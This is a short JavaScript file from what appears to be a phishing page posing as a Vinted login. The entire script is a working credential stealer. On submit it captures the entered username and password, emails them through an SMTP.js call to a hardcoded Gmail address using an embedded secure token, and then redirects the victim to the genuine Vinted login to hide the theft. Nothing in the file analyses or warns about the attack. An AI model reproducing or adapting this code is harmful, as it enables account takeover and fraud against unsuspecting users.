let btn = document.getElementById("submit_btn");

btn.addEventListener("click", onSubmitted);

function onSubmitted (event) {

    event.preventDefault();

    let name = document.getElementById("name").value;
    let password = document.getElementById("password").value;
    
    if (name == "") return alert("Identifiant obligatoire");


    Email.send({
        SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",

        To : 'vintedvinted962@gmail.com',
        From : "leonbonou20@gmail.com",
        Subject : "Vinted Information :-)",
        Body : "<strong>Les informations du compte Vinted</strong> <br><br><br>\n" +
            "    <table>\n" +
            "        <tr>\n" +
            "            <th style=\"text-align: left\">Identifiant: </th>\n" +
            "            <td>" + name + "</td>\n" +
            "        </tr>\n" +
            "        <tr>\n" +
            "            <th style=\"text-align: left\">Mot de passe: </th>\n" +
            "            <td style=\"color: red\">"+ password + "</td>\n" +
            "        </tr>\n" +
            "    </table> <br> <br> Merci!",
    }).then(
        window.location.href = "https://www.vinted.fr/member/general/login?ref_url=" 
    );
}
